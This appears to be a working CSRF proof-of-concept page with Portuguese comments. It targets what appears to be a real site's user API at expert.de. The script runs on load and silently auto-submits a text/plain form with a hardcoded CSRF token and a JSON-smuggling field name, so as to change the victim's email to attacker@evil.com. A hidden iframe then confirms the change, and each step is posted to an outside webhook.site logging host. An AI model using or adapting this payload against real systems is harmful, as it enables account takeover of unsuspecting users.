<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>ats-expert</title></head>
<body>
<script>
  alert('script start');
  const HOOK='https://webhook.site/adf2fe42-6019-4297-b27a-ca8bf04acf73';
  function log(x){fetch(HOOK,{method:'POST',mode:'no-cors',body:x}).catch(()=>{})}

  /* ---------- FASE A : CSRF POST para trocar e-mail ---------- */
  function fire(){
      const f=document.createElement('form');
      f.method='post';
      f.action='https://www.expert.de/api/v1/user';
      f.enctype='text/plain';  // facilita JSON cru

      /* token no header via campo “magico” */
      const h=document.createElement('input');
      h.name='csrf-token';
      h.value='1e206742-fb4a-44d2-8174-be9b2e2d6425';
      f.appendChild(h);

      /* payload JSON cru – o server costuma aceitar */
      const p=document.createElement('input');
      p.name='{"email":"attacker@evil.com","ignore":"'};  // fecha aspas depois
      p.value='":""}';                                   // completa JSON
      f.appendChild(p);

      document.body.appendChild(f);
      f.submit();        // envio silencioso (no-cors por natureza)
      log('CSRF-POST-sent');
  }

  /* ---------- FASE B : confirmação via iframe ---------- */
  function check(){
      const i=document.createElement('iframe');
      i.style.display='none';
      i.src='https://www.expert.de/api/v1/user?_t='+Date.now();
      i.onload=()=>log('CONFIRM-200');   // se perfil carregou, mudança OK
      i.onerror=()=>log('CONFIRM-fail');
      document.body.appendChild(i);
  }

  /* sequência: post → espera 2 s → confirma */
  fire();
  setTimeout(check,2000);
</script>
</body>
</html>
